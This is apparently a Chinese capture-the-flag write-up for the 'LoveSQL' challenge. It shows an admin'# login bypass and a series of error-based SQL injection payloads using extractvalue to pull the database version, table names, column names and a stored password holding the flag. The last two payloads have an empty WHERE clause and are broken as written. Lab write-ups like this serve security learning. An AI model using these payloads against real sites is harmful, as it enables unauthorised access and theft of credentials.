# \[极客大挑战 2019]LoveSQL

## \[极客大挑战 2019]LoveSQL

## 考点

* SQL注入万能密码登陆
* 报错注入

## wp

用户名为 `admin'#` 密码任意填写，成功登陆

用户名 `admin' order by 10 #` 提示\
`Unknown column '10' in 'order clause'`

使用报错注入，payload : `admin' and extractvalue(1,concat(0x7e,(select @@version),0x7e)) #`

获取geek库中的表 `admin' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='geek' limit 1,1),0x7e)) #`

比较关键的是 `l0ve1ysq1`，`geekuser`

获取表中的列 `admin' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='geekuser'),0x7e)) #`

两个表中的列都是 `id,username,password`

测试了一下发现 flag 在 l0ve1ysq1 的最后一个用户的 password 中

正序输出\
`admin' and extractvalue(1,concat(0x7e,(select password from l0ve1ysq1 where ),0x7e)) #`

逆序输出\
`admin' and extractvalue(1,concat(0x7e,(select reverse(password) from l0ve1ysq1 where ),0x7e)) #`

拼接一下 flag 即可
